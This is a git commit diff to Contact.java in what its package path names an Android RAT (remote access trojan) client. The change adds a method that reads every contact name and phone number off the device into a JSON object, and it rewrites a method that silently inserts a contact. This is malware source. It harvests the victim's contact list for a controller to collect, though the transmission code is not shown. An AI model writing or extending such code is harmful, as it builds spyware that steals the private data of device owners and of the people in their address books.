f344462118f31a6a74955a4f820c0a651439e8ed
Olorunfemi-Ojo Tomiwa <ot.server1@outlook.com>
2022-02-12 22:02:55 +0100

    Update Contact.java

--- client/app/src/main/java/com/ot/androidrat/Contact.java
+++ client/app/src/main/java/com/ot/androidrat/Contact.java
@@ -1,16 +1,28 @@
 package com.ot.androidrat;
 
 import android.content.ContentProviderOperation;
+import android.content.Context;
 import android.content.OperationApplicationException;
+import android.database.Cursor;
 import android.os.RemoteException;
 import android.provider.ContactsContract;
 import android.view.View;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.util.ArrayList;
 
 public class Contact {
 
-    public void writeContact(View view){
+    private Context context;
+
+    public Contact (Context context) {
+        this.context = context;
+    }
+
+    public void writeContact(){
         ArrayList contentProviderOperations = new ArrayList();
         //insert raw contact using RawContacts.CONTENT_URI
         contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
@@ -24,15 +36,36 @@ public class Contact {
                 .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                 .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, "012345678").withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build());
         try {
-            new MainActivity().getContentResolver().applyBatch(ContactsContract.AUTHORITY, contentProviderOperations);
-        } catch (RemoteException e) {
-            e.printStackTrace();
-        } catch (OperationApplicationException e) {
+            context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, contentProviderOperations);
+        } catch (RemoteException | OperationApplicationException e) {
             e.printStackTrace();
         }
     }
 
-    public void readContacts(){
+    public JSONObject readContacts(){
+        try {
+            JSONObject contacts = new JSONObject();
+            JSONArray list = new JSONArray();
+            Cursor cur = this.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+
+
+            while (cur.moveToNext()) {
+                JSONObject contact = new JSONObject();
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
+                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
+
+                contact.put("phoneNo", num);
+                contact.put("name", name);
+                list.put(contact);
+
+            }
+            contacts.put("contactsList", list);
+            return contacts;
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        return null;
 
     }
 
